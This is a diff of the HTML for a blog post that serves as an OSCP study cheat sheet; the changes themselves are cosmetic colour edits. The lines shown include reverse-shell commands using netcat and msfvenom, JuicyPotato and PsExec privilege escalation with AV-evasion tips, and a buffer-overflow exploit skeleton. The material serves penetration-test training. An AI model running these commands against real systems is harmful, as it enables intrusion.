@@ -9,7 +9,7 @@ Since my OSCP certification exam is coming up, I decided to do a writeup of the 
 That being said - it is far from an exhaustive list.">
 <meta name=keywords content="homepage,blog,cas van cooten,security,hacking,PWK,OSCP,Hacking">
 <meta name=robots content="noodp">
-<meta name=theme-color content="#252627">
+<meta name=theme-color content>
 <link rel=canonical href=https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/>
 <title>
 OSCP Cheat Sheet and Command Reference :: Cas van Cooten — I ramble about security stuff, mostly
@@ -170,7 +170,7 @@ That being said - it is far from an exhaustive list.">
 </blockquote>
 <h3 id=smtp-25tcp>SMTP (25/tcp)</h3>
 <p>You may be able to enumerate usernames through SMTP.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>nc 10.11.1.217 25
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>nc 10.11.1.217 25
 [...]
 VRFY root
 252 2.0.0 root
@@ -268,8 +268,8 @@ Most hashes I encountered during my time in the PWK labs are unsalted (MD5 or (N
 <h4 id=juicypotato>JuicyPotato</h4>
 <p>Relevant if you have the <code>SeImpersonatePrivilege</code> and the OS version is <em>older than</em> Server 2019 or Windows 10. I&rsquo;ve had the biggest successes by using a neutral binary such as <code>nc.exe</code> or <code>nc64.exe</code> from <a href=https://eternallybored.org/misc/netcat/>here</a>. If you create a <code>bat</code> file with the command call, it should evade most AV and give you a privileged shell.</p>
 <p>Grab a CLSID from <a href=https://ohpe.it/juicy-potato/CLSID/>here</a>, it may take a couple of different attempts to get a working CLSID.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd># On target system, after copying required binaries
-<span style=color:#6ab825;font-weight:700>echo</span> C:\temp\nc64.exe -e cmd.exe $LHOST 443 &gt; rev.bat
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd># On target system, after copying required binaries
+<span style=color:#66d9ef>echo</span> C:\temp\nc64.exe -e cmd.exe $LHOST 443 &gt; rev.bat
 .\JuicyPotato.exe -l 1337 -p C:\temp\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 </code></pre></div><blockquote>
 <p>Alternatives to the above are available. Play with tools like <a href=https://github.com/TsukiCTF/Lovely-Potato>LovelyPotato</a> as well, which automate the finding of the CLSID.</p>
@@ -278,7 +278,7 @@ Most hashes I encountered during my time in the PWK labs are unsalted (MD5 or (N
 <p>Relevant if you are a local administrator, but <code>whoami /all</code> returns that you are running in a &ldquo;Medium integrity process&rdquo;. The method of exploitation differs widely per OS version. Googling for automated UAC bypass exploits for a specific version, or using <a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>Windows-Exploit-Suggester</a> or metasploit to ID possible UAC bypass vulnerabilities is likely to have success.</p>
 <h4 id=local-admin-to-system>Local Admin to SYSTEM</h4>
 <p>Even though this is strictly not required for PWK or the OSCP certification exam, I always like to get a full <code>SYSTEM</code> shell. We can realize this with <code>PsExec.exe</code> (from <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>here</a>). You can use a Msfvenom executable instead of <code>rev.bat</code>, but the latter works better for AV evasion (see <code>JuicyPotato</code>).</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>.\PsExec.exe -i -s &#34;c:\temp\rev.bat&#34;
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>.\PsExec.exe -i -s &#34;c:\temp\rev.bat&#34;
 </code></pre></div><blockquote>
 <p>If you have a shell on a Windows system and a password for another user, PsExec can also be used to execute programs as the target user.</p>
 <pre tabindex=0><code>.\PsExec.exe -user $USERNAME -p $PASSWORD &quot;c:\temp\rev.bat&quot;
@@ -315,40 +315,40 @@ Most hashes I encountered during my time in the PWK labs are unsalted (MD5 or (N
 <ol>
 <li>
 <p>Impacket-smbserver</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure .
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure .
 
-<span style=color:#999;font-style:italic># On target system - copy files</span>
-copy <span style=color:#ed9d13>\\</span><span style=color:#40ffff>$LHOST</span><span style=color:#ed9d13>\s</span>ecure<span style=color:#ed9d13>\n</span>c64.exe .
+<span style=color:#75715e># On target system - copy files</span>
+copy <span style=color:#ae81ff>\\</span>$LHOST<span style=color:#ae81ff>\s</span>ecure<span style=color:#ae81ff>\n</span>c64.exe .
 </code></pre></div><p>`</p>
 </li>
 <li>
 <p>Impacket-smbserver (with SMBv2 support)
 Seems to work in some cases, if you get a &ldquo;not subscriptable&rdquo; error otherwise.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure . -smb2support
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure . -smb2support
 
-<span style=color:#999;font-style:italic># On target system - spawn shell straight from share</span>
-<span style=color:#ed9d13>\\</span><span style=color:#40ffff>$LHOST</span><span style=color:#ed9d13>\s</span>ecure<span style=color:#ed9d13>\n</span>c64.exe <span style=color:#40ffff>$LHOST</span> <span style=color:#40ffff>$LPORT</span> -e cmd.exe
+<span style=color:#75715e># On target system - spawn shell straight from share</span>
+<span style=color:#ae81ff>\\</span>$LHOST<span style=color:#ae81ff>\s</span>ecure<span style=color:#ae81ff>\n</span>c64.exe $LHOST $LPORT -e cmd.exe
 </code></pre></div><p>`</p>
 </li>
 <li>
 <p>SMB Daemon
 Works most of the time, but is some hassle to set up and doesn&rsquo;t give you NetNTLM hashes as a bonus.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>service smbd start
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>service smbd start
 </code></pre></div><p>`</p>
 </li>
 </ol>
 <h3 id=linux-1>Linux</h3>
 <p>I usually use a simple HTTP server from python to <code>curl</code> or <code>wget</code> files on demand.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m http.server <span style=color:#3677a9>80</span> <span style=color:#999;font-style:italic># Starts a web server in the current directory on port 80</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m http.server <span style=color:#ae81ff>80</span> <span style=color:#75715e># Starts a web server in the current directory on port 80</span>
 </code></pre></div><p>There are some nice alternatives in case this is not possible. Examples are base64-encoding and netcat.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat <span style=color:#40ffff>$FILENAME</span> | base64 <span style=color:#999;font-style:italic>#copy output</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat $FILENAME | base64 <span style=color:#75715e>#copy output</span>
 
-<span style=color:#999;font-style:italic># On target</span>
-<span style=color:#24909d>echo</span> -n <span style=color:#ed9d13>&#34;</span><span style=color:#40ffff>$BASE64FILE</span><span style=color:#ed9d13>&#34;</span> | base64 -d | bash <span style=color:#999;font-style:italic># run the file in bash</span>
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lvnp <span style=color:#3677a9>443</span> &lt; <span style=color:#40ffff>$FILENAME</span>
+<span style=color:#75715e># On target</span>
+echo -n <span style=color:#e6db74>&#34;</span>$BASE64FILE<span style=color:#e6db74>&#34;</span> | base64 -d | bash <span style=color:#75715e># run the file in bash</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lvnp <span style=color:#ae81ff>443</span> &lt; $FILENAME
 
-<span style=color:#999;font-style:italic># On target</span>
-nc <span style=color:#40ffff>$LHOST</span> <span style=color:#3677a9>443</span> &gt; <span style=color:#40ffff>$FILENAME</span>
+<span style=color:#75715e># On target</span>
+nc $LHOST <span style=color:#ae81ff>443</span> &gt; $FILENAME
 </code></pre></div><h2 id=pivoting>Pivoting</h2>
 <p>SSH access always gives you the easiest pivot. You can set up a SOCKS proxy by adding the <code>-D</code> flag as follows.</p>
 <pre tabindex=0><code>ssh $USERNAME@$RHOST -D 1080
@@ -412,16 +412,16 @@ On target:</p>
 </blockquote>
 <p>Addresses in little endian format, so address <code>0xabcdef10</code> becomes <code>\x10\xef\xcd\xab</code>.</p>
 <h3 id=generate-shellcode>Generate shellcode</h3>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfvenom -p windows/shell_reverse_tcp <span style=color:#40ffff>LHOST</span>=<span style=color:#40ffff>$LHOST</span> <span style=color:#40ffff>LPORT</span>=<span style=color:#40ffff>$LPORT</span> <span style=color:#40ffff>EXITFUNC</span>=thread -f py -b <span style=color:#ed9d13>&#39;\x00&#39;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfvenom -p windows/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>$LHOST LPORT<span style=color:#f92672>=</span>$LPORT EXITFUNC<span style=color:#f92672>=</span>thread -f py -b <span style=color:#e6db74>&#39;\x00&#39;</span>
 </code></pre></div><h3 id=add-nop-sled>Add NOP sled</h3>
 <p>Just to ensure the payload is referenced correctly.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>nopsled = <span style=color:#ed9d13>&#39;</span><span style=color:#ed9d13>\x90</span><span style=color:#ed9d13>&#39;</span> * <span style=color:#3677a9>16</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>nopsled <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
 </code></pre></div><h3 id=finalize-exploit>Finalize exploit</h3>
 <p>At a high level, your buffer becomes something like the following for a simple BoF.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>buffer = <span style=color:#ed9d13>&#34;A&#34;</span> * <span style=color:#3677a9>1337</span> <span style=color:#999;font-style:italic># Identified overflow offset</span>
-buffer += <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\x10\xef\xcd\xab</span><span style=color:#ed9d13>&#34;</span> <span style=color:#999;font-style:italic># EIP, pointing to your chosen instruction (e.g. JMP ESP)</span>
-buffer += <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\x90</span><span style=color:#ed9d13>&#34;</span> * <span style=color:#3677a9>16</span> <span style=color:#999;font-style:italic># NOP sled</span>
-buffer += exploit_code
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>buffer <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1337</span> <span style=color:#75715e># Identified overflow offset</span>
+buffer <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x10\xef\xcd\xab</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># EIP, pointing to your chosen instruction (e.g. JMP ESP)</span>
+buffer <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span> <span style=color:#75715e># NOP sled</span>
+buffer <span style=color:#f92672>+=</span> exploit_code
 </code></pre></div>
 </div>
 </article>
